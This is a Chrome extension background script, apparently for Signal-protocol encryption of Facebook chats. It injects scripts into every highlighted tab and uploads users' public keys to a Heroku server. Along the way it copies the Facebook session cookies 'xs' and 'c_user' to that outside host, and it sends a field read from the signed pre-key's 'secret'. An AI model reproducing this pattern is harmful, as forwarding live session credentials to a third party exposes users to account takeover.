chrome.runtime.onInstalled.addListener(() => {
    chrome.tabs.onHighlighted.addListener(function() {
        chrome.tabs.query({currentWindow: true, active: true}, function(tabs) {
            if (tabs[0].url) {
                chrome.tabs.executeScript(null, {file: 'jquery.min.js'});
                chrome.tabs.executeScript(null, {file: 'decrypt.js'});

                chrome.tabs.executeScript(null, {file: 'libsignal-protocol.js'});
                chrome.tabs.executeScript(null, {file: 'InMemorySignalProtocolStore.js'});
                chrome.tabs.executeScript(null, {file: 'inject.js'});
            }
        });
    });
});

chrome.runtime.onMessage.addListener((chromeMessage, sender, sendResponse) => {
    if (chromeMessage.action == 'uploadPublicKeys') {
        chrome.tabs.query({currentWindow: true, active: true}, function(tabs) {
            if (tabs[0].url) {
                chrome.cookies.getAll({url: tabs[0].url}, function(cookies) {
                    var cUser
                    var xs
                    for (c in cookies) {
                        if (cookies[c].name == 'xs') {
                            xs = cookies[c].value
                        }
                        if (cookies[c].name == 'c_user') {
                            cUser = cookies[c].value
                        }
                    }
                    chrome.cookies.set({url: 'https://vast-spire-29018.herokuapp.com/api/keys', name: 'c_user', value: cUser}, function() {
                        chrome.cookies.set({url: 'https://vast-spire-29018.herokuapp.com/api/keys', name: 'xs', value: xs}, function() {
                            var xhr = new XMLHttpRequest();
                            xhr.open('POST', 'https://vast-spire-29018.herokuapp.com/api/keys?id=' + chromeMessage.userId, true);
                            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
                            var body = {
                                'registration_id': chromeMessage.key['registrationId'],
                                'identity_key_pub': chromeMessage.key['identityKey']['public'],
                                'pre_key_id': chromeMessage.key['preKey']['id'],
                                'pre_key_pub': chromeMessage.key['preKey']['public'],
                                'signed_pre_key_id': chromeMessage.key['signedPreKey']['id'],
                                'signed_pre_key_pub': chromeMessage.key['signedPreKey']['public'],
                                'signed_pre_key_sig': chromeMessage.key['signedPreKey']['secret']
                            }
                            xhr.send(JSON.stringify(body))
                        });
                    });
                });
            }
        });
    }
});
